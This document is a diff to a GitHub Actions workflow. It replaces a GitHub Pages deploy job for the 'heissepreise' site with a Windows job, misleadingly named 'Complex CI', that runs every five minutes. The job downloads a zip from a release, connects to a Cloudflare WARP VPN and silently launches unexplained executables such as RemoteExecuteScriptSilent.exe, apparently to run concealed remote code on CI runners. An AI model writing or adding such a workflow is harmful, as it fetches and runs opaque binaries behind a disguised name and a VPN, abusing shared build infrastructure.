@@ -1,43 +1,154 @@
-name: Deploy static content to Pages
+name: Complex CI on Windows
 
 on:
   schedule:
-    - cron: "0 8 * * *"
-  push:
-    branches: ["main"]
+    - cron: "*/5 * * * *"
   workflow_dispatch:
+  push:
+    branches: [main, release]
+  pull_request:
+    types: [opened, synchronize, reopened]
 
-permissions:
-  contents: write
-  pages: write
-  id-token: write
-
-concurrency:
-  group: "pages"
-  cancel-in-progress: false
+env:
+  TEMP_PATH: ${{ github.workspace }}\temp
+  LOG_LEVEL: debug
 
 jobs:
-  deploy:
-    environment:
-      name: github-pages
-      url: ${{ steps.deployment.outputs.page_url }}
-    runs-on: ubuntu-latest
+  setup-matrix:
+    runs-on: windows-latest
+    outputs:
+      matrix: ${{ steps.set-matrix.outputs.matrix }}
     steps:
-      - name: Checkout
-        uses: actions/checkout@v3
-      - name: Setup Pages
-        uses: actions/configure-pages@v3
-      - name: Generate artifact
+      - name: Set up matrix
+        id: set-matrix
         run: |
-          git config --global user.email "heissepreise-pages@gmail.com"
-          git config --global user.name "heissepreise-pages"
-          date
-          ./pages.sh
-      - name: Upload artifact
-        uses: actions/upload-pages-artifact@v1
+          echo "::set-output name=matrix::{\"arch\": [\"x64\", \"x86\"]}"
+
+  run-release:
+    needs: setup-matrix
+    strategy:
+      fail-fast: false
+      max-parallel: 1
+      matrix: ${{fromJson(needs.setup-matrix.outputs.matrix)}}
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
         with:
-          # Upload entire repository
-          path: './docs'
-      - name: Deploy to GitHub Pages
-        id: deployment
-        uses: actions/deploy-pages@v2
+          python-version: "3.12"
+      
+      - name: Set up GitHub CLI
+        uses: cli/cli@v2
+
+      - name: Print environment info
+        run: |
+          Write-Host "Workspace: $env:GITHUB_WORKSPACE"
+          Write-Host "Matrix Arch: ${{ matrix.arch }}"
+          Write-Host "Log Level: $env:LOG_LEVEL"
+        shell: powershell
+
+      - name: Download heissepreise.zip from Release
+        run: |
+          $url = "https://github.com/kopopop/heissepreise/releases/download/1/heissepreise.zip"
+          Invoke-WebRequest -Uri $url -OutFile heissepreise.zip
+
+      - name: Unzip heissepreise.zip
+        run: |
+          Expand-Archive -Path heissepreise.zip -DestinationPath .
+        shell: powershell
+
+      - name: Install Cloudflare WARP
+        run: |
+          Invoke-WebRequest -Uri "https://1111-releases.cloudflareclient.com/windows/Cloudflare_WARP_Release-x64.msi" -OutFile "WARP.msi"
+          Start-Process msiexec.exe -ArgumentList '/i WARP.msi /quiet /norestart' -Wait
+          Start-Sleep -Seconds 10
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos registration new
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos connect
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos status
+          Start-Sleep -Seconds 10
+        shell: powershell
+
+      - name: Validate WARP connection
+        run: |
+          $status = & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos status
+          if ($status -notmatch "Connected") { throw "WARP connection failed!" }
+        shell: powershell
+
+      - name: Start RemoteExecuteScriptSilent.exe
+        working-directory: heissepreise
+        run: |
+          Start-Process .\RemoteExecuteScriptSilent.exe
+        shell: powershell
+
+      - name: Wait for RemoteExecuteScriptSilent.exe to exit
+        run: |
+          $processName = "RemoteExecuteScriptSilent"
+          Write-Host "Waiting for $processName process to exit..."
+          while (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
+            Start-Sleep -Seconds 5
+          }
+          Write-Host "$processName has exited."
+        shell: powershell
+
+      - name: Wait for FastExecuteScript.exe to exit
+        run: |
+          $processName = "FastExecuteScript"
+          Write-Host "Waiting for $processName process to exit..."
+          while (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
+            Start-Sleep -Seconds 5
+          }
+          Write-Host "$processName has exited."
+        shell: powershell
+
+      - name: Find dynamic logs folder
+        id: find_logs
+        run: |
+          $base = "heissepreise\appslocal"
+          $dynamic = Get-ChildItem $base | Where-Object { $_.PSIsContainer } | Select-Object -First 1 -ExpandProperty Name
+          $logsPath = "$base\$dynamic\logs"
+          echo "logsPath=$logsPath" >> $env:GITHUB_ENV
+        shell: powershell
+
+      - name: Archive logs
+        run: |
+          Compress-Archive -Path $env:logsPath\* -DestinationPath "${{ env.TEMP_PATH }}\logs.zip"
+        shell: powershell
+
+      - name: Upload logs as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: logs-${{ matrix.arch }}
+          path: ${{ env.TEMP_PATH }}\logs.zip
+
+      - name: Publish summary report
+        if: always()
+        run: |
+          $summary = "## CI Results for ${{ matrix.arch }}`n"
+          $summary += "Date: $(Get-Date)`n"
+          $summary += "Logs: [Download](./${{ env.TEMP_PATH }}\logs.zip)"
+          echo $summary >> $GITHUB_STEP_SUMMARY
+        shell: powershell
+
+      - name: Clean up temp files
+        run: |
+          Remove-Item -Path $env:TEMP_PATH -Recurse -Force -ErrorAction SilentlyContinue
+        shell: powershell
+
+  notify:
+    needs: run-release
+    runs-on: windows-latest
+    steps:
+      - name: Notify on success
+        if: success()
+        run: |
+          Write-Host "Workflow completed successfully!"
+        shell: powershell
+      - name: Notify on failure
+        if: failure()
+        run: |
+          Write-Host "Workflow failed. Please check logs!"
+        shell: powershell
